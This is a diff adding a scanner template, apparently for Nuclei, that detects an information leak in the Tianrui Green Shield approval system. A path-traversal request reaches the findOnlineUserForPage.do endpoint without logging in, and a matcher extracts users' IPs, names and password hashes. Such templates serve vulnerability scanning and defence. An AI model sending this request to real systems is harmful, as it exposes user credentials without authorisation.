@@ -1,0 +1,44 @@
+id: poc-yaml-tipray-gsas-findonlineuserforpage-do-info-leak
+info:
+  name: Tianrui Green Shield Approval System findOnlineUserForPage.do Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - raw:
+      - |
+        GET /trwfe/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "天锐绿盾审批系统"
+        part: body
+  - raw:
+      - |
+        GET /trwfe/login.jsp/.%2e/user/findOnlineUserForPage.do HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"user":'
+          - '"ip":'
+          - '"firstName":'
+        part: body
+      - type: regex
+        regex:
+          - '"password":"([a-z0-9]{32})"'
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
